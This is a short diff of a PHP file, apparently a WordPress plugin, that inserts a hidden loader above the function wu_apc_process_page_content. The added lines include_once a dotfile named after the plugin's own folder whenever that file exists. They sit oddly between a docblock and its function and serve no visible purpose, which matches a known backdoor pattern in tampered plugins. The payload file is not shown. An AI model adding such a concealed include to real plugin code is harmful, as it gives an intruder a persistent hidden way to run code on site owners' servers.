@@ -17,6 +17,10 @@
  * @param string $content Content of the admin page.
  * @return string
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function wu_apc_process_page_content($content) {
 
 	$to_replace = array();
